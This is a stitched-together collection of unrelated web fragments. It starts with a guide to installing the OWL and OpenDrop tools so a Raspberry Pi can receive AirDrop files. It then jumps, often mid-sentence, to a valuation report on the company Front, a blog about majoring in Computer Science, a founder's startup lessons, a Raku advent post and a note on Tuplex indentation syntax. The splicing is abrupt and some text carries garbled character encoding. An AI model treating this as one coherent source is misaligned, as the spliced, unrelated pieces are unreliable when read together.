<p>Next, we are installing <a href="https://github.com/seemoo-lab/owl">OWL</a>, our AWDL implementation. First, we need some libraries (libpcap, libev, and libnl).</p>

<div><div><pre><code><span>sudo </span>apt <span>install </span>libpcap-dev libev-dev libnl-3-dev <span>\</span>
                 libnl-genl-3-dev libnl-route-3-dev
</code></pre></div></div>

<p>Then, it should be as easy as:</p>

<div><div><pre><code>git clone https://github.com/seemoo-lab/owl.git
<span>cd </span>owl
git submodule update <span>--init</span>
<span>mkdir </span>build
<span>cd </span>build
cmake ..
make
<span>sudo </span>make <span>install</span>
</code></pre></div></div>

<h2 id="install-opendrop">Install OpenDrop</h2>

<p>In the last step, we’ll install our AirDrop-compatible <a href="https://github.com/seemoo-lab/opendrop">OpenDrop</a> client and server.
Again, we need some dependencies:</p>

<div><div><pre><code><span>sudo </span>apt <span>install </span>python3 python3-pip libjpeg-dev libopenjp2-7-dev
</code></pre></div></div>

<p>Then, we can clone and install the software.</p>

<div><div><pre><code>git clone https://github.com/seemoo-lab/opendrop.git
<span>sudo </span>pip3 <span>install</span> ./opendrop
</code></pre></div></div>

<div>
	<p><a href="https://owlink.org/assets/raspi-airdrop.png">
		<img title="Sending a file to a Raspberry Pi 3 via AirDrop" alt="Sending a file to a Raspberry Pi 3 via AirDrop" src="https://owlink.org/assets/raspi-airdrop.png">
	</a></p><p>Sending a file to a Raspberry Pi 3 via AirDrop</p>
</div>

<h2 id="receive-files-via-airdrop">Receive files via AirDrop</h2>

<p>Now that all tools are installed, we can start a test run and use the Raspberry Pi to receive files via AirDrop.</p>

<p>Since we use Nexmon to enable monitor mode, we need to manually enable monitor mode and set the correct Wi-Fi channel (the RPi3 only supports the 2.4 GHz band, so we’ll use channel 6).</p>

<div><div><pre><code><span>sudo </span>iw phy <span>`</span>iw dev wlan0 info | gawk <span>'/wiphy/ {printf "phy" $2}'</span><span>`</span> interface add mon0 <span>type </span>monitor
<span>sudo </span>ifconfig mon0 up
<span>sudo </span>nexutil <span>-k6</span>
</code></pre></div></div>

<p>Next, we start <code>owl</code> to enable frame reception via AWDL (option <code>-N</code> tells <code>owl</code> that the interface is already in monitor mode, you can add <code>-v</code> to increase the logging output).</p>



<p>In a second shell, we can start the <code>opendrop</code> receiver.</p>



<p>Now, when opening the sharing pane on an iOS device, a new receiver appears after a short delay and we can send files!</p>

And Front was, at first, popular mostly with support teams and other teams that deal with a high volume of customer inquiries. But over time, Front has grown from being a product for a specific kind of workflow to being a tool that people use across organizations.</p><p>The fact is that most companies are still stuck in time from twenty years ago when it comes to managing how they triage, assign, and respond to all those emails. That's a big pain point, because as it turns out, a lot of the critical work that companies do takes place over email. </p><p>What Front has realized is that owning the orchestration and collaboration around email puts them in a position to “back into” $66B worth of vertical markets—CRM, project management, knowledge management, conversational marketing, and others.</p><p>To show the size of that opportunity and demonstrate the progress that Front has made towards its goal in this report, we aggregated all the public data out there on Front, then extrapolating and interpolating to fill in the gaps using backchannels to confirm our numbers.&nbsp;</p><p>We learned that Front, like Slack, has consumer-grade engagement, elite compounding revenue from their land and expand strategy, and increasingly broad adoption inside teams.</p><p>By focusing on external vs. internal communication, however, Front may also have a TAM that is several times as large as Slack's.</p><h2 id="front-s-roadmap-to--2b--4b--20b">Front's roadmap to $2B/$4B/$20B</h2><ul><li><strong>Our financial model values Front at $1.3B, with a price per share around $11.</strong> At their Series C in January, they were valued at $920M, or about $7.70~ per share.</li><li><strong>Front is currently trading on the secondary market between $7.25 and $9.00 per share.</strong> 5-year IRR for each scenario in our model ranges from 3% to 22% in the bear case, 22% to 46% in the base case, and 84% to 118% in the bull case.</li><li><strong>Front is like Slack for email</strong>. It is a multiplayer tool that lets teams better communicate—via chatting with other team members within the context of a personal or shared inbox—and coordinate—via tagging, rules, and 3rd-party integrations—how they respond to email.</li><li><strong>Front's 72% DAU/MAU ratio is on par with elite, consumer-grade apps</strong>. WhatsApp was at 70% pre-Facebook acquisition. Combined with its 148 minutes of average active daily usage (compare to Slack at 90 minutes) Front effectively has the engagement of a high-grade consumer app.</li><li><strong>Front's 137% net dollar retention demonstrates they are landing and expanding with an extremely efficient bottom-up model.</strong> Compare to 143% for Slack at IPO and 140% for Zoom at IPO.</li><li><strong>Zendesk and Intercom pose a threat because they have much deeper access to customer data. </strong>Intercom embeds itself in their customers' websites, giving them direct insight into the behavior of their customers, while Zendesk serves as a centralized hub for all things sales, support, and/or knowledge management for hundreds of thousands of companies.</li><li><strong>However, Front's high engagement platform makes them attractive to third-party developers. </strong>The more activity Front can promote on its platform, and the larger the variety of integrations their customers are using, the more adoption they'll have inside organizations and the wider their moat—based on the cost of switching away to another email product—will become.</li><li><strong>Expanding across organization opens up the opportunity to "back into" $66B worth of adjacent vertical markets </strong>. While today Front is focused on facilitating third-party integrations to tools like Hubspot, Marketo, and Salesforce, building their own versions of these products would allow them to (at minimum, and per product) 2-3x their average revenue per user—today, Zendesk's Enterprise plan costs $199 a seat, while Front's most expensive plan is just $79 per seat.</li><li><strong>Building their own vertical solutions also puts Front on a converging course with Salesforce ($226B), Microsoft ($1.63T), and Google ($1.19T).</strong> Front's endgame is essentially to recreate the Google or Office 365 suite. But Microsoft was able to overtake Slack's active user count within just two years—a company that had similar ambitions. The threat Microsoft/Google pose and their ability to freely push copycat products to a user base of millions could make it extremely challenging for Front to move upmarket and reach enterprise scale.</li><li><strong>Front's product also makes them an attractive acquisition target. </strong>Rather than attempt to build their own team email product, Microsoft and/or Google could buy Front. That said, Salesforce is the company most likely to acquire Front—both because they don't have any email tool of their own yet and because there's no risk of cannibalization or customer confusion as there would be with a Microsoft/Google acquisition.</li><li><strong>Ultimately, Front’s consumer-grade engagement and ability to achieve org-wide adoption position them well to compete on their own in the cloud productivity space</strong>. Most deep workflow products serve specific functional units (Intercom, Zendesk, Salesforce) while products that serve whole teams (Outlook, Gmail) have only superficial access to customer data. Front, on the other hand, is a workflow product and an org-wide tool all in one: a combination that could make them a formidable competitor even to the 800 lb. gorillas of B2B SaaS.
</li></ul><h2 id="valuation--front-is-worth--1-3b">Valuation: Front is worth $1.3B</h2><p>Today, based on our model, we estimate Front is worth about $1.3B, with a fair share price of $9.5 to $11.</p><p>That’s up 40% from Front’s Series C, which valued the company at about $7.7 per share or $920M post-money. At the time, Front was at $26M ARR growing 5% CMGR6 for a 35x multiple.&nbsp;</p><p>Today, we project Front is at about $38M ARR or $3.1M MRR, growing 3% CMGR6.&nbsp;</p><img src="https://images.prismic.io/sacra/731caebc-6ce9-4c26-8451-56f39d4618df_image13.png?auto=compress,format"><p><em>Applying the 35x multiple from Front’s last round to their current $38M revenue run rate gives us a valuation of $1.3B and an implicit per share price of $11. <a href="https://sacra.com/research/front-initiating-coverage-research-report/access" rel="noopener noreferrer" target="_blank">Click here</a> to get the full data set.</em></p><p>Slack, for reference, was growing at 12% CMGR6 at the same ARR. According to our model, Front hasn’t grown at more than 10% CMGR6 since the summer of 2017, with growth hanging steady around 5% CMGR between April 2019 and early 2020, then declining slightly with the onset of COVID-19 in March.&nbsp;</p>

              <p>This is my own journey on getting a CS degree and why I think you should or shouldn't major in Computer Science.</p><p>If you google right now, what are the best majors to study in college, it's a guarantee that Computer Science (CS) will be on almost every list. There are so many statistics about how much <a href="https://insights.dice.com/2019/06/12/computer-science-graduates-earnings/">CS graduates make</a>. At some big companies the likes of FAANG (Facebook, Amazon, Apple, Netflix, Google), fresh CS graduates can easily command six figures salaries, including benefits and cool perks. The total compensation in these companies is hardly less than six figures ($100,000)!</p><p>Computer Science is considered one of the top majors as far as ROI (Return on Investment) is concerned. Just year one out of school and into the workforce a CS grad will be making higher compared to grads from other majors. Even when someone isn't lucky enough to land one of the positions in big tech companies (FAANG), still they can easily make 55k fresh from school. <em>It should also be noted that the writer of this article is based in the US, so the figures here might not be so representative of other regions in the world.</em></p><p>So looking at the job prospects and earning potential, you can see why there is such a flux of students wanting to do CS in college.</p><p>And here is the question, should you major in Computer Science? </p><p>This post is about my journey on deciding to major in CS and why I would advise someone to major or not to major in CS. </p><p>...</p><p>December 2014, I got the news that I will be going to a small college in the Midwest of the United States for my college education. I was 23 by the time and at that point in my life, I had made some big life mistakes already (like quitting high school to become a professional athlete). As you might have guessed that didn't end well. 2 years and a half taught me a lot about life, dreams, aspirations. and most importantly it taught me about family...that will be a blog post for some other time. But there I was reading the email that in about 8 months I would be in school again for my bachelor's. Before quitting high school, I used to say to myself... "if I go to college I would study Psychology and Philosophy"...because the two fields really dug my intellectual curiosity. But when people asked me what would I do with Psychology or Philosophy...I didn't know what to tell them...I only knew I wanted to learn more about the two fields. I wasn't interested in a professional career in any of the two fields...just wanted to study them. Did that ever happen to you?</p><p>So I didn't want to make the same mistakes I did during high school years...I intentionally made a choice of choosing a major field of study that will be lucrative and pretty much guarantee me success. There I was googling the best majors to study in college.</p><p>Here is a short snippet of that research:</p><figure><img src="https://monalidor.com/content/images/2020/11/Majors-That-Pay-Back.png" alt="Majors That Pay You Back" srcset="https://monalidor.com/content/images/size/w600/2020/11/Majors-That-Pay-Back.png 600w, https://monalidor.com/content/images/size/w1000/2020/11/Majors-That-Pay-Back.png 1000w, https://monalidor.com/content/images/size/w1600/2020/11/Majors-That-Pay-Back.png 1600w, https://monalidor.com/content/images/2020/11/Majors-That-Pay-Back.png 2000w" sizes="(min-width: 720px) 720px"><figcaption>Majors That Pay You Back</figcaption></figure><figure><img src="https://monalidor.com/content/images/2020/11/Major-vs-Salary.png" alt="Major vs Salary Potential" srcset="https://monalidor.com/content/images/size/w600/2020/11/Major-vs-Salary.png 600w, https://monalidor.com/content/images/size/w1000/2020/11/Major-vs-Salary.png 1000w, https://monalidor.com/content/images/size/w1600/2020/11/Major-vs-Salary.png 1600w, https://monalidor.com/content/images/2020/11/Major-vs-Salary.png 2000w" sizes="(min-width: 720px) 720px"><figcaption>Major vs Salary Potential</figcaption></figure><p>Armored with that research plus a lot of other information I got from friends who were already studying CS and those who graduated with good jobs, I narrowed to Computer Science.</p><p>...</p><p>Fall 2015, my first year in college:</p><figure><div><div><p><img src="https://monalidor.com/content/images/2020/11/Fall-2015-CS-Classes.png" width="2000" height="1200" alt="" srcset="https://monalidor.com/content/images/size/w600/2020/11/Fall-2015-CS-Classes.png 600w, https://monalidor.com/content/images/size/w1000/2020/11/Fall-2015-CS-Classes.png 1000w, https://monalidor.com/content/images/size/w1600/2020/11/Fall-2015-CS-Classes.png 1600w, https://monalidor.com/content/images/2020/11/Fall-2015-CS-Classes.png 2000w" sizes="(min-width: 720px) 720px"></p><p><img src="https://monalidor.com/content/images/2020/11/Spring-2016-CS-Classes.png" width="2000" height="1200" alt="" srcset="https://monalidor.com/content/images/size/w600/2020/11/Spring-2016-CS-Classes.png 600w, https://monalidor.com/content/images/size/w1000/2020/11/Spring-2016-CS-Classes.png 1000w, https://monalidor.com/content/images/size/w1600/2020/11/Spring-2016-CS-Classes.png 1600w, https://monalidor.com/content/images/2020/11/Spring-2016-CS-Classes.png 2000w" sizes="(min-width: 720px) 720px"></p></div></div><figcaption>Fall 2015 (Left) &amp; Spring 2016(Right) CS Classes</figcaption></figure><p>Sophomore year, Fall 2016</p><figure><div><div><p><img src="https://monalidor.com/content/images/2020/11/Fall-2016-CS-Classes.png" width="2000" height="1200" alt="" srcset="https://monalidor.com/content/images/size/w600/2020/11/Fall-2016-CS-Classes.png 600w, https://monalidor.com/content/images/size/w1000/2020/11/Fall-2016-CS-Classes.png 1000w, https://monalidor.com/content/images/size/w1600/2020/11/Fall-2016-CS-Classes.png 1600w, https://monalidor.com/content/images/2020/11/Fall-2016-CS-Classes.png 2000w" sizes="(min-width: 720px) 720px"></p><p><img src="https://monalidor.com/content/images/2020/11/Spring-2017-CS-Classes.png" width="2000" height="1200" alt="" srcset="https://monalidor.com/content/images/size/w600/2020/11/Spring-2017-CS-Classes.png 600w, https://monalidor.com/content/images/size/w1000/2020/11/Spring-2017-CS-Classes.png 1000w, https://monalidor.com/content/images/size/w1600/2020/11/Spring-2017-CS-Classes.png 1600w, https://monalidor.com/content/images/2020/11/Spring-2017-CS-Classes.png 2000w" sizes="(min-width: 720px) 720px"></p></div></div><figcaption>Fall 2016 (Left) &amp; Spring 2017 (Right) CS Classes</figcaption></figure><p>By the end of Spring semester 2017, I had completed<strong> 22 credits of the 46 credits</strong> required by the CS program at my school.</p><p>In the fall of 2017, I didn't return back to campus...I had an opportunity to study abroad in London where for the whole semester I didn't take any Computer Science class.

But for easy of following through I just listed in the order of the first time I took them. In addition, I took one elective from another school which was <strong>CS 428</strong> <strong>Network Programming, </strong>and also I took <strong>EN 300C,</strong> an <strong>Advanced Writing</strong> class from another department in my school which substituted for my <strong>Technical Writing</strong> class in my CS major. And one more <strong>Math class</strong> was required to satisfy the requirements for the CS major.</p><p>So in a nutshell, that was my major. 4.5 or 5 years later, <strong>46 CS credits</strong> bagged and I graduated with a bachelor's in Computer Science.</p><p>The reason I listed all those classes above is to give you kinda a full picture of what a CS degree is about. When you just hear the words 'Computer Science', you might not really know what it's about...So the subjects above will at least shade some light. However, if you really wanna dive deep, I would suggest not just to look at the subjects offered in the program BUT make sure you read the syllabus too if you're able to get one. Syllabi will list topic by topic and week by week of exactly what the specific CS subjects will cover, there will be no surprises!</p><p>...</p><p>Now comes the meat of my blog post...Should you major in Computer Science?</p><p>Taking the money component out - we already know that a CS major can result in higher earning potential overall. What other reasons are there for you to major in Computer Science? Are you even interested in the field itself?</p><p>Most people when they hear about the Tech fields or Silicon Valley or working at Google or Microsoft, they mostly think about Computers and they might think about Computer Science as a way to get there, though they might not really know much about the Computer Science field itself.</p><p>I don't blame them, I was in the same situation...Initially I thought Computer Science will be learning about how to create these beautiful websites that I see on the Internet. Or maybe by studying Computer Science I will be able to make the next Facebook, Instagram and so forth. That was what initially clouded my mind.</p><p>Some of you might be surprised to know that a career in tech especially the one involving Computer Science or Programming for that matter...might not necessarily constitute you making products from scratch. There will be a lot of trying to understand, fix and maintain past code base. It might not be as alluring as some of the TV shows might make you believe. The technologies you work with might not be the ones of your interest. For example, I have never liked C# as a programming language or .NET framework as a web dev platform but there I was at my first job...using Windows, Visual Studio and .NET framework. You can imagine how excited I was.</p><p>...</p><p>As someone who has traveled this journey though not for so long, I can't emphasize enough on the importance of knowing exactly what you're getting yourself into. After all, college is a big investment both in terms of money and time, so pick both your majors and careers carefully. One way of getting a good feel for what you're getting yourself into, either it's Computer Science or any other field is to make sure you get some internships while in college. Get an internship in something you're either majoring in or considering a career in. That will give you real-world experience of what your profession will look like once you graduate. It will give you time to think about the work culture, the work hours, the pressure, the work itself, etc. ...I had a friend in college who after doing an internship for about 4 months or so...he found out a career in Computer Science or programming wasn't for him. And he went ahead and changed his major from Computer Science to Economics, on the way he secured a minor in Computer Science.</p><figure><img src="https://monalidor.com/content/images/2020/12/Monalidor---Do-you-like-your-job.png" alt="Do you like your job?" srcset="https://monalidor.com/content/images/size/w600/2020/12/Monalidor---Do-you-like-your-job.png 600w, https://monalidor.com/content/images/size/w1000/2020/12/Monalidor---Do-you-like-your-job.png 1000w, https://monalidor.com/content/images/size/w1600/2020/12/Monalidor---Do-you-like-your-job.png 1600w, https://monalidor.com/content/images/2020/12/Monalidor---Do-you-like-your-job.png 2000w" sizes="(min-width: 720px) 720px"><figcaption>Do you like your job?</figcaption></figure><p>One of the things that will make you like your job is by first enjoying studying the field that you're in. Do you enjoy the field you're majoring in?</p><p>Look at the classes I listed above, do they interest you in any way? If they do then congrats! A CS program might be a good fit. But don't just end there like I said in the beginning...I would like you to go and check the syllabus for all those classes and see what you will study week in and week out. </p><p>Let me tell you something... as someone who was more interested in web development...I didn't enjoy most if not all of my CS classes. Had I used that time to learn more about web design and development...learning specific languages used for the job I would have benefited more and enjoyed my time in college. Here am talking about web development technologies like JavaScript, PHP and their frameworks together with WordPress, SASS, the JAM stack, etc.</p><p>So what am I trying to say here..? If the reason you decided to get into a CS program is because you love to design and develop websites...then you might be in the wrong place...a CS class in Computational modeling will be pretty much a bore to you. You would appreciate that time instead if you were learning first hand the tools and languages you will be working with in the real world.</p><p>Walk this process backward...ask yourself...who do you want to become...a web developer? a software engineer? a UI/UX engineer? a database administrator..? a network engineer? Then once you know whom you want to become...look for resources that will allow you to do that...these might involve a major in college, maybe a minor, books, online courses, tools used in the industry, etc.</p><p> If you pick a major, don't be blinded by a bracket name like a 'Computer Science'. Understand exactly what that entails...go and look at the syllabus of each course you will take in that major. Don't just assume a CS major will grant you those mobile or web development skills etc. The job market can be very specific...They might look for a Java developer, a PHP developer, a Python developer, an iOS developer etc. While knowledge of one language might help you easily pick up another one...it's a good thing if you can focus on what you're interested in early on. </p><p>...Being a mobile developer is …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>In Segmentâ€™s early days, we hit countless problems as a founding team. And at the time, I thought those problems were unique to our own special snowflake of a founding journey. I chalked it up to us being new grads and first-time founders.</p><p>But as I've worked with more and more startups, I've realized just how wrong I was.</p><p>Over the past five years, I've made about 25 different seed-stage investments. In doing so, it's taught me a <em>LOT</em> about the common errors that startup founders make. Even across different industries and levels of experience, I see founders hitting the exact same set of problems we encountered in the early days of Segment!</p><p>This post shares a handful of the top lessons that benefit todayâ€™s early stage founders. Itâ€™s a list of the things I wish weâ€™d figured out earlier at Segment. [1]</p><p>This sounds incredibly boring... but the #1 mistake I see startups making is that they donâ€™t set goals. If you take one thing from this post, it's that you should set goals for where you want to be.</p><p>For the longest time at Segment, we didn't have goals. We moved ahead in various (often random) directions, and we would launch features consistently... but we never really set goals at all.</p><p>As we grew the company, we started to lose momentum. Teams were spending time on a bunch of stuff that frankly just didn't really matter to the overall business.</p><p>It wasn't until we hired our VP Eng, Tido, that we finally started setting focused and audacious product goals. Just by verbalizing where we wanted to go and then grading our results, our velocity improved by an order of magnitude.</p><p>I don't care if you call them OKRs, sprints, or something else entirely. Just set a deadline when you want to have something done and a metric you want to move or some other concrete result.</p><p>When early stage founders do attempt to set goals, I often see them agonize over what specific goals to choose. In practice, a "pretty good goal" is way better than "no goals at all". Perfect is the enemy of good.</p><p>If you don't yet have product-market fit, your goal should probably be getting your first 3-5 customers using the product. If you've hit the level where you now have dozens of users, your goal should be growing by an order of magnitude. It's better to get in the habit of setting and driving towards goals rather than being too worried about their exact semantics. Worst case, you just pick a better goal later.</p><p>A great set of goals answers the question: <em><strong>"what would have to be true in order for us to feel good about our progress at the end of the month?"</strong></em><em> [2]</em></p><p>If each teammate can independently answer "what are our goals for the month?" in the same way, you'll know you've succeeded. If youâ€™re looking for prior art, read <a href="https://www.amazon.com/Measure-What-Matters-Google-Foundation/dp/0525536221">Measure What Matters</a>. </p><p>If you strictly focus on making things true by a certain date, you are bound to make at least some progress towards your end result. </p><p>At the end of the day, every billion-dollar startup is really just the sum of many small deltas.</p><p>Let's get one thing straight: your investors won't know everything. But investors won't know <em>anything</em> if you don't keep them updated on how things are going.</p><p>For the longest time, we were fearful of our Segment investors, to the point that we wouldn't bother sending them emails unless they asked about us. I can say now with confidence that this was 100% the wrong approach.</p><p>We worried that investors would think that we were screwing up (true) and failing (true as well!). And while that might be the case, a founder-friendly investor won't think that way. Investors, especially angels, invested because they believe in <em>you</em>. If I didn't think a team would go somewhere, I wouldn't put money in.</p><p>With each investor, <strong>include the goals you're working towards, as well as the asks for them</strong>. I think monthly is about the right cadence for this in the early days, moving to quarterly around Series A/B time when you start partnering more with a few board members.</p><p>Simply writing the updates should clarify your own thinking tremendously. If it takes you more than 1-2h to put together an update on the most important things happening at the company, it's probably a sign that you should be doing more thinking about the big picture.</p><p>When asking for help, the things that our investors have been able to help us with evolved quite a bit over time. But here's a good rule of thumb for what to ask for:</p><ul><li><p><u>Seed/Pre-seed</u>: user-testing, intros to beta users, hiring</p></li><li><p><u>Series A</u>: hiring, early customers, go-to-market</p></li><li><p><u>Series B/C+</u>: comparables at other companies, senior/exec hires, specific expertise around things like management, infrastructure, systems, etc.</p></li></ul><p>Not all investors will be able to help with everything. But at the very least, sending them information will help you be top of mind. I've lost track of how many times a moment of serendipity where I'm catching up with an old friend has led to a meaningful conversation for a company I've invested in.</p><p>As an extra bonus, the strongest startups send these updates to everyone on their team. It's amazing how much putting the goals in writing helps everyone stay on the same page about what's most important.</p><p>One other note here: take pictures. I now wish we had far more pictures of Segment at every stage of the company. They help turn investor updates into cherished memories.</p><p>Okay, this lesson is taken directly from the YC playbook. And YET, I see so many founders (including YC founders) fail to launch their product. </p><p>If no one notices your launch... just ignore it and then launch again. If you're doing things right, you'll never run out of stuff to launch! [3]</p><p>Why is launching so important? Let me share a personal story...</p><p>We spent about 1.5 years building different iterations of analytics tools. For every iteration, we had a waitlist that users could sign up to use. We personally reached out to the users who we thought were the best fits, and then tried to set up time to use the product. </p><p>The result? Nobody cared. We had no users. We never launched. </p><p>When we finally launched Segment in it's current incarnation, we threw out that approach entirely. We put up a self-service flow, and let anyone who wanted to sign up for it.</p><p>That's when something strange happened... we attracted an entirely new set of developers who just were crawling out of the woodwork and excited to use the new product we'd built. They were coming from companies far outside of SV that we'd never heard of.</p><p>It floored me.</p><p><strong>Lesson learned: the people you happen to be talking to now are probably not the people who have the biggest problem in your space. Do everything you can to reach the folks with the biggest problem, and then, reduce any barriers they might encounter.</strong></p><p>I expect a bunch of you reading this post to ignore this advice, just like we did in the early days. It takes a certain confidence to launch something you've built and put it out there for the world to see. Ultimately though, the rewards are worth it. You'll see users coming from communities you've never even heard of.</p><p>Let me tell you a tale of two startups.</p><p><strong>Startup A</strong> is constantly putting up interesting content on their blog. Their founders are sharing product launches, engineering posts, and creatively brainstorming about what it takes to solve problems in their market.</p><p><strong>Startup B</strong> is operating in stealth. You can't find much about them online, but one of the founders reached out with a nice personalized email mentioning their funding by a top-tier VC. </p><p>Suppose you're looking for a job... do you pick Startup A or Startup B? In my experience, A almost always wins. Momentum is a compounding force.</p><p><strong>Unless you are working in a space that heavily depends on IP, you should probably be publishing more content about what you are doing.</strong> This could be open source, it could be a weekly newsletter, it could be a changelog. [4]</p><p>Whatever it is, it's going to help you both hire <em>and</em> attract customers. So much of the internet is merely about consuming, that just by putting ideas out there, youâ€™ll have a leg up on the competition.</p><p>In the early days of Segment, our <a href="https://segment.com/blog/show-hn-to-series-d/">user acquisition was powered by open source projects and blog posts</a>. But I've seen founders have success with Twitter, Substacks, Podcasts and a variety of different channels.</p><p>If you're looking for inspiration, the <a href="https://railway.app/changelog">Railway</a> and <a href="https://linear.app/changelog">Linear</a> changelogs are epic examples. Companies like <a href="https://baremetrics.com/blog/i-sold-baremetrics">Baremetrics</a> and <a href="https://buffer.com/resources/shareholder-update-q2-2020-and-july/">Buffer</a> differentiated themselves by just being open and honest. <a href="https://stripe.com/blog/globe">Stripe</a> and <a href="https://www.figma.com/blog/behind-the-feature-the-making-of-the-new-auto-layout/">Figma's blogs</a> not only share what they build, but how they built it.</p><p>There are three big inputs that all startups need to continue growing</p><ol><li><p>product capabilities</p></li><li><p>customers and users</p></li><li><p>hiring</p></li></ol><p>I've put them in roughly the order that most teams encounter them. </p><p>Startups begin with a small product that has a modicum of utility. It starts attracting a handful of customers organically. And as more and more customers start using the product, the founders realize that they need extra help to stay on top of all of those requests.</p><p>Remember though, the real goal here is #2. Itâ€™s not the size of your team, itâ€™s the value youâ€™re able to provide to the world. [5]</p><p>I see hiring a big team before you have product-market fit as a red flag. If the company doesn't yet have a set direction, it's going to be harder to pivot with 10 people than it is with 3.</p><p>But, I've worked with startups who have traction and runway... and just seem to be spinning their wheels under load from existing customers.</p><p>I get it. Hiring isn't the most fun, especially for an introvert. It's a lot of interviewing and feeling like there's a lot of rejection. Rejecting people sucks. Losing candidates sucks.

<p>‘<a href="https://perl.org/">Perl</a> is dead’, is a meme that’s just plain wrong. <a href="https://www.perl.org/about.html">Perl isn’t dead</a>. It’s just dead to some programmers. Complicated regexes? Sigils? There’s more than one way to do it (<a href="https://docs.raku.org/language/glossary#TMTOWTDI">TMTOWTDI</a>)? Sometimes when programmers encounter Perl in the wild they react with fear. “WTF!?”, they cry! But fear needn’t be a Perl killer. If you take the time to see past Perl’s imperfections and <a href="https://www.perl.org/learn.html">walk the learning curve</a>, there are rich rewards: Perl is an imperfect but pragmatic and expressive language that for 30+ years has helped programmers get the job done.</p>



<p>When <a href="https://en.wikipedia.org/wiki/Larry_Wall">Larry Wall</a> <a href="https://design.raku.org/">designed</a> <a href="https://raku.org/">Raku</a>, with the <a href="https://github.com/Raku/mu/blob/master/AUTHORS">help of the Perl community,</a> he fixed most of Perl’s imperfections and doubled down on Perl’s DNA. Perl values pragmatism, expressivity, and whipupitude and Raku does too! Why stop at sigils ($@%) when you can have twice the fun with <a href="https://docs.raku.org/language/variables#Twigils">twigils</a> ($!, %!, @! etc)?</p>



<p>For some programmers, however, the mere sight of a twigil can induce fear. Like Perl, Raku’s expressive power is a double-edged sword – potentially stopping other programmers in their tracks. A Raku programmer’s, “<a href="https://docs.raku.org/language/glossary#DWIM">DWIM</a>” (do what I mean) can be another programmer’s, “<a href="https://docs.raku.org/language/glossary#WAT">WAT</a>!?”</p>



<h2><a href="https://gist.github.com/nige123/2b7b384dfe2c6e732ecb1c62b3ce6c52#fear-free-code-that-flows"></a></h2>



<h2>Fear-free code that <em>flows</em></h2>



<p>We write programs for two audiences: humans and the computer. It’s the humans that should come first. If I can’t understand my own code in a week’s time, what hope do my colleagues have? Fortunately we can help ourselves, and each other, to have a smooth ride up the Raku learning curve.</p>



<figure><a href="https://camo.githubusercontent.com/adae2c7bc72f3b2b7480d1769cd89dddab1eb4302e4cafd7930760a584477dfb/68747470733a2f2f7065726c36616476656e742e66696c65732e776f726470726573732e636f6d2f323031352f31322f63616d656c69612d666c6f77696e672e676966" target="_blank" rel="noreferrer noopener"><img src="https://camo.githubusercontent.com/adae2c7bc72f3b2b7480d1769cd89dddab1eb4302e4cafd7930760a584477dfb/68747470733a2f2f7065726c36616476656e742e66696c65732e776f726470726573732e636f6d2f323031352f31322f63616d656c69612d666c6f77696e672e676966" alt=""></a></figure>



<p>Learning Raku is never boring but when did you last encounter a bump while learning Raku? That’s a chance for you to help yourself and others. You could leave an empathic comment in your code, contribute some documentation, write a blog post, give a talk, ask and answer a question on StackOverflow etc.</p>



<p>The joy of programming is <em><a href="https://perl6advent.wordpress.com/2015/12/20/perl-6-christmas-have-an-appropriate-amount-of-fun/">finding flow</a> </em>for ourselves and each other while getting things done. No Raku-riffing-rockstars required.</p>

<h2>Surfing the learning curve</h2>



<p>Maybe you haven’t started learning Raku yet? Now is the perfect time to add Raku to your toolbox. Here are some of the learning resources I’ve found useful and I hope you do too.</p>



<p>Firstly, there is the pithy and concise <a href="https://raku.guide/">introduction to Raku</a> that includes instructions on how to install Raku. The Raku interpreter itself is very helpful. If your Raku program contains errors <a href="https://perl6advent.wordpress.com/2016/12/19/fixing-flow/">Raku often suggests ways to fix them</a>.</p>



<p>For programmers coming from other language(s), <a href="http://www.rosettacode.org/wiki/Category:Raku">RosettaCode</a> showcases coding solutions in different languages side-by-side. Prepare to be pleasantly surprised by the expressive power of Raku’s operators. Raku’s expressivity typically results in <a href="http://www.rosettacode.org/wiki/Last_Friday_of_each_month#Raku">less lines of code</a> (LLOC).</p>



<p>An idea for your first Raku program is to translate a progam you know well from a different language. Here are some helpful guides for translating from other languages to Raku: <a href="https://docs.raku.org/language/5to6-nutshell">Perl</a>, <a href="https://docs.raku.org/language/py-nutshell">Python</a>, <a href="https://docs.raku.org/language/rb-nutshell">Ruby</a>, <a href="https://docs.raku.org/language/haskell-to-p6">Haskell</a> and <a href="https://docs.raku.org/language/js-nutshell">Javascript</a>.</p>



<p>There’s a growing list of books on Raku and a <a href="https://perl6book.com/">flowchart for choosing one</a>. Here’s a selection:</p>



<ul><li><a href="https://www.learningraku.com/">Learning Raku</a></li><li><a href="https://www.apress.com/gp/book/9781484261088">Raku Fundamentals</a></li><li><a href="https://www.apress.com/gp/book/9781484262573">Raku Recipes</a></li><li><a href="https://www.apress.com/gp/book/9781484232279">Parsing with Perl 6 Regexes and Grammars</a></li></ul>



<p>Searching for Raku-related problems will often point to the official documentation at <a href="https://docs.raku.org/">docs.raku.org</a> or <a href="https://stackoverflow.com/questions/tagged/raku">Raku answers on StackOverflow</a>.</p>



<p>When you want to learn more about a specific sub-topic or dive into the deeper design philosophy of Raku check out <a href="https://www.jnthn.net/slides.html">Jonathan Worthington’s clear presentations and explanations</a>.</p>



<p>Finally if you’re stuck on something, or just want to share in the –<a href="https://www.raku.org/fun/">Ofun</a> of learning Raku the <a href="https://www.raku.org/community/irc">#raku IRC channel on freenode</a> is friendly and welcoming.</p>



<p>Both Perl and Raku are useful tools in any programmer’s toolbox: no fear needed, just remember to help the code <em>flow</em>!</p>



<p>Long live Perl and Raku.</p>



<p>Happy Christmas!</p>

<p>Labels: Syntax</p>

<h3 id="indentation-defined-program-structure">Indentation-defined program structure</h3>

<p>I’ve planned for a long while to make Tuplex program structure indentation-defined like in e.g. Python.
Dispensing with curly braces and semicolons makes the code easier on the eye, and easier to type.
However this required a complete rewrite of the lexical scanner - the first compilation pass that scans the source text -
so I had been putting it off. Now it’s done!</p>

<h3 id="syntax-summary">Syntax summary</h3>

<p>The scanner will produce tokens INDENT and DEDENT upon increases and decreases in the indent level.
These have the same semantic meaning regarding scope structure as { and } did previously.</p>

<blockquote>
  <p>If a decrease doesn’t match an earlier indent level an <em>inconsistent indentation</em> error is generated.</p>
</blockquote>

<p>A sub-scope is preceded by a header, which ends with a colon and a newline, and is demarcated using an increased indent.
(A missing INDENT after COLON NEWLINE is an error.)</p>

<div><div><pre><code>if i &gt; 0:
    do_this()
    do_that()
else:
    do_other_stuff()
do_in_any_case()
</code></pre></div></div>

